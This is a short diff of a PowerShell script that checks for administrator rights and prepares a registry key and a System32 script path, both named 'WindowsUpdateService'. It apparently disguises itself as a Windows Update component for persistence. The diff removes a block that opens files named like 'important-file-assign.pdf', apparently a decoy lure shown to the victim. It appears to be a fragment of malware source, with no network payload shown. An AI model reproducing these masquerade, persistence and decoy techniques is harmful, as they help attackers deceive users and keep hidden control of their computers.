@@ -11,14 +11,6 @@ if (-not $isAdmin) {
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 
-#Opening the file, name should contain "assign", such as important-file-assign.pdf/docx etc.
-if ($matchingFiles.Count -gt 0) {
-  foreach ($file in $matchingFiles) {
-      # Open each matching file with the default associated program
-      Invoke-Item -Path $file.FullName
-  }
-}
-
 # Check if the registry path exists, create it if not
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
